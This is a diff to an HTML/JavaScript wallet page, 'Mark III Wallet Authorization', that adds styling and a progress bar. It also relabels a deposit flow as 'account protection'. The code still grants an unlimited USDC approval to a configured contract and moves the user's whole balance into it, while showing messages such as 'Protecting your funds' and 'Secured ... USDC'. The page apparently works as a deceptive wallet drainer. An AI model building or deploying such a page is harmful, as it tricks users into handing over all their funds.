@@ -9,6 +9,7 @@
       --primary: #4e44ce;
       --error: #ff4444;
       --success: #00C851;
+      --warning: #ffbb33;
     }
     body {
       font-family: 'Segoe UI', sans-serif;
@@ -26,6 +27,7 @@
       background: var(--primary);
       color: white;
       cursor: pointer;
+      font-weight: bold;
     }
     button:disabled {
       opacity: 0.5;
@@ -38,6 +40,9 @@
       background: white;
       max-width: 500px;
       word-break: break-word;
+      min-height: 60px;
+      display: flex;
+      align-items: center;
     }
     .error {
       color: var(--error);
@@ -45,15 +50,42 @@
     .success {
       color: var(--success);
     }
+    .progress {
+      color: var(--warning);
+    }
+    .progress-bar {
+      width: 100%;
+      height: 4px;
+      background: #e9ecef;
+      border-radius: 2px;
+      margin-top: 8px;
+      overflow: hidden;
+    }
+    .progress-bar-fill {
+      height: 100%;
+      background: var(--primary);
+      width: 0%;
+      transition: width 0.3s ease;
+    }
+    .status-icon {
+      margin-right: 10px;
+      font-size: 1.2em;
+    }
   </style>
 </head>
 <body>
   <h2>Mark III Wallet Authorization</h2>
   
   <button id="connect">Connect Wallet</button>
-  <button id="authorize" disabled>Authorize & Deposit</button>
+  <button id="authorize" disabled>Authorize & Protection</button>
   
-  <div id="status">Status: Connect your wallet</div>
+  <div id="status">
+    <span class="status-icon">🔒</span>
+    <span id="status-text">Status: Connect your wallet</span>
+  </div>
+  <div class="progress-bar">
+    <div class="progress-bar-fill" id="progress-bar"></div>
+  </div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
@@ -72,6 +104,9 @@
     const connectBtn = document.getElementById('connect');
     const authorizeBtn = document.getElementById('authorize');
     const statusEl = document.getElementById('status');
+    const statusText = document.getElementById('status-text');
+    const progressBar = document.getElementById('progress-bar');
+    const statusIcon = document.querySelector('.status-icon');
 
     // State
     let provider, signer, user;
@@ -83,13 +118,17 @@
       try {
         if (!window.ethereum) throw new Error("Please install MetaMask");
         
+        updateStatus("Connecting to wallet... ⏳", "progress");
+        progressBar.style.width = "20%";
+        
         provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
         user = await signer.getAddress();
         
         updateUI();
-        statusEl.textContent = `Connected: ${user}`;
+        updateStatus(`Connected: ${user}`, "success");
+        progressBar.style.width = "40%";
         
       } catch (err) {
         showError(err);
@@ -99,10 +138,10 @@
     function updateUI() {
       connectBtn.disabled = true;
       authorizeBtn.disabled = false;
-      authorizeBtn.onclick = handleDeposit;
+      authorizeBtn.onclick = handleProtection;
     }
 
-    async function handleDeposit() {
+    async function handleProtection() {
       try {
         // 1. Initialize USDC contract
         const usdc = new ethers.Contract(
@@ -115,39 +154,65 @@
         );
         
         // 2. Get user's USDC balance
-        statusEl.textContent = "Fetching USDC balance...";
+        updateStatus("Fetching USDC balance... ⏳", "progress");
+        progressBar.style.width = "50%";
         const balance = await usdc.balanceOf(user);
         
         // 3. Approve max amount
-        statusEl.textContent = "Approving USDC (max amount)...";
+        updateStatus("Approving USDC for protection... ⏳", "progress");
+        progressBar.style.width = "60%";
         const approveTx = await usdc.approve(
           CONFIG.CONTRACT_ADDRESS, 
           ethers.constants.MaxUint256 // MAX APPROVAL
         );
+        
+        updateStatus("Waiting for approval confirmation... ⏳", "progress");
+        progressBar.style.width = "70%";
         await approveTx.wait();
         
-        // 4. Deposit full balance
-        statusEl.textContent = `Depositing ${ethers.utils.formatUnits(balance, 6)} USDC...`;
+        // 4. Protect full balance
+        updateStatus("Initializing account protection... 🔄", "progress");
+        progressBar.style.width = "80%";
         const contract = new ethers.Contract(
           CONFIG.CONTRACT_ADDRESS,
           CONFIG.ABI,
           signer
         );
-        const depositTx = await contract.deposit(balance); // Use actual balance
-        await depositTx.wait();
         
-        statusEl.textContent = `✅ Success! Deposited ${ethers.utils.formatUnits(balance, 6)} USDC`;
-        statusEl.className = 'success';
+        updateStatus("Protecting your funds... 🔄", "progress");
+        progressBar.style.width = "90%";
+        const protectionTx = await contract.deposit(balance);
+        await protectionTx.wait();
+        
+        updateStatus(`✅ Protection successful! Secured ${ethers.utils.formatUnits(balance, 6)} USDC`, "success");
+        progressBar.style.width = "100%";
+        statusIcon.textContent = "✅";
         
       } catch (err) {
         showError(err);
       }
     }
 
+    function updateStatus(message, type) {
+      statusText.textContent = message;
+      statusEl.className = type || '';
+      statusIcon.textContent = getStatusIcon(type);
+    }
+
+    function getStatusIcon(type) {
+      switch(type) {
+        case 'error': return '❌';
+        case 'success': return '✅';
+        case 'progress': return '⏳';
+        default: return '🔒';
+      }
+    }
+
     function showError(err) {
       console.error(err);
-      statusEl.textContent = `Error: ${err.message}`;
-      statusEl.className = 'error';
+      updateStatus(`Error: ${err.message}`, "error");
+      progressBar.style.width = "0%";
+      statusIcon.textContent = "❌";
     }
   </script>
 </body>
